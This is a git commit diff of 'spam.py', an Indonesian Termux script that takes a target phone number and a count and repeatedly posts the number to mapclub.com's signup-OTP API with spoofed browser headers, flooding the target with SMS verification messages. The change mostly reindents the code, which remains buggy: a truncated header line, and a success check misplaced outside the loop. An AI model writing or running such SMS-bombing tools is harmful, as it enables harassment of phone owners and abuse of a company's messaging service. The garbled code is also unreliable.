257165a89f8098c1240edbfede9e5e56bf450153
GRCR4K3R <94230332+GRCR4K3R@users.noreply.github.com>
2021-11-19 16:34:08 +0700

    Update spam.py

--- spam.py
+++ spam.py
@@ -7,9 +7,9 @@ import sys
 import os
 
 def main():
-  os.system('clear')
-  os.system('figlet Spam Pesan')
-  banner = '''
+        os.system('clear')
+        os.system('figlet Spam Pesan')
+        banner = '''
 =======================================
 =    (+)Author    : Reza Alfauzan     =
 =    (+)Youtube   : Reja Gaming       =
@@ -20,27 +20,26 @@ def main():
 > Welcome To Termux <
 ====> Gua Ganteng:v <====
 '''
-  
-  print(banner)
-  no = input('Nomor Target ==> : ')
-  jum = input('Jumlah Spam ==> :')
-  
-  head = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
-    "Referer": "https://www.mapclub.com/en/user/signup",
-    "Host: "cmsapi.mapclub.com",
-  }
-  
-  dat = {
-    'phone' : no
-  }
-  
-  for x in range(int(jum)):
-    leosureo =requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
-    if 'error' in leosureo:
-      print('Gagal Mengirimn:)' + no)
-      else:
-        print('Berhasil Mengirim :' + no)
+
+        print(banner)
+        no = input('Nomor Target ==> : ')
+        jum = input('Jumlah Spam ==> :')
+
+        head = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0>
+        "Referer": "https://www.mapclub.com/en/user/signup",
+        "Host": "cmsapi.mapclub.com",
+        }
+        
+        dat = {
+        'phone' : no
+        }
         
         
-        main()
+        for x in range(int(jum)):
+                leosureo =requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+        if 'error' in leosureo:
+                print('Gagal Mengirimn:)' + no)
+        else:
+                print('Berhasil Mengirim :' + no)
+main()
